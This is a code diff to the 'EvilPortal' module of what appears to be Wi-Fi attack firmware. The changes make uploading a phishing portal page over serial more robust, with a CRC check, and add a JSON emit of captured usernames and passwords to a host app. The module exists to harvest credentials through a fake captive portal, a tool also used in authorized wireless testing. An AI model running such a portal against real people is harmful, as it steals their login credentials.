@@ -1,4 +1,5 @@
 #include "EvilPortal.h"
+#include "JsonSerial.h"
 
 char apName[MAX_AP_NAME_SIZE] = "PORTAL";
 
@@ -24,6 +25,19 @@ bool replacePortalHtml(const char* html, size_t length) {
 }
 
 AsyncWebServer server(80);
+
+// CRC-32 (IEEE 802.3, poly 0xEDB88320) over a byte range. Matches the host's
+// Crc32 (and Buffer's capture-frame CRC) so the app can verify the uploaded
+// portal page byte-for-byte.
+static uint32_t ep_crc32(const uint8_t* data, size_t len) {
+  uint32_t crc = 0xFFFFFFFFu;
+  for (size_t i = 0; i < len; i++) {
+    crc ^= data[i];
+    for (int b = 0; b < 8; b++)
+      crc = (crc >> 1) ^ (0xEDB88320u & (uint32_t)(-(int32_t)(crc & 1u)));
+  }
+  return crc ^ 0xFFFFFFFFu;
+}
 
 void EvilPortal::setup() {
   this->runServer = false;
@@ -139,20 +153,64 @@ void EvilPortal::setupServer() {
   });
 }
 
-void EvilPortal::setHtmlFromSerial() {
-  #ifndef MARAUDER_V8
-    Serial.println(F("Setting HTML from serial..."));
+void EvilPortal::setHtmlFromSerial(int contentLength) {
+  // Bound the request to what the on-device buffer can hold.
+  if (contentLength < 0) contentLength = 0;
+  if (contentLength > MAX_HTML_SIZE - 1) contentLength = MAX_HTML_SIZE - 1;
+
+  // Scratch buffer for the incoming page; replacePortalHtml() installs it into
+  // index_html (board-neutral, frees the previous page) once the read completes.
+  #ifdef HAS_PSRAM
+    char* buf = (char*) ps_malloc(contentLength + 1);
+  #else
+    char* buf = (char*) malloc(contentLength + 1);
   #endif
-  const String html = Serial.readString();
-  if (!replacePortalHtml(html.c_str(), html.length())) {
-    Serial.println(F("Unable to allocate HTML buffer"));
+  if (buf == nullptr) {
+    Serial.println(F("@J {\"t\":\"portal\",\"state\":\"set\",\"ok\":false,\"err\":\"alloc\"}"));
     return;
   }
-  this->has_html = true;
-  this->using_serial_html = true;
-  #ifndef MARAUDER_V8
-    Serial.println("html set");
-  #endif
+
+  // Tell the host we are ready and how big a page the device can hold, then read
+  // EXACTLY contentLength raw bytes (no readString() timeout guessing, and no
+  // dangling pointer into a destroyed temporary String).
+  Serial.print(F("@J {\"t\":\"portal\",\"state\":\"recv\",\"max\":"));
+  Serial.print(MAX_HTML_SIZE);
+  Serial.println(F("}"));
+
+  size_t got = 0;
+  unsigned long last = millis();
+  while (got < (size_t)contentLength) {
+    int c = Serial.read();
+    if (c >= 0) {
+      buf[got++] = (char)c;
+      last = millis();
+    } else if (millis() - last > 4000) {
+      break;               // host stalled mid-transfer: stop instead of hanging
+    } else {
+      delay(1);
+    }
+  }
+  buf[got] = '\0';
+
+  uint32_t crc = ep_crc32((const uint8_t*)buf, got);
+  bool ok = (got == (size_t)contentLength && got > 0);
+
+  // Install through the shared helper so allocation/free matches the rest of the
+  // module and works on non-PSRAM boards too (it frees the previous page).
+  if (got > 0) replacePortalHtml(buf, got);
+  free(buf);
+
+  this->has_html = (got > 0);
+  this->using_serial_html = (got > 0);
+
+  // Final confirmation: byte count + CRC-32 so the host can verify the upload.
+  Serial.print(F("@J {\"t\":\"portal\",\"state\":\"set\",\"n\":"));
+  Serial.print((uint32_t)got);
+  Serial.print(F(",\"crc\":"));
+  Serial.print(crc);
+  Serial.print(F(",\"ok\":"));
+  Serial.print(ok ? F("true") : F("false"));
+  Serial.println(F("}"));
 }
 
 bool EvilPortal::setHtml() {
@@ -418,6 +476,8 @@ void EvilPortal::main(uint8_t scan_mode) {
 
     Serial.print(line);
     buffer_obj.append(line);
+    // Structured emit for JSON-mode hosts (the app's live Evil Portal screen).
+    JsonSerial::emitCred(this->user_name, this->password);
     #ifdef HAS_SCREEN
         this->sendToDisplay(line);
     #endif
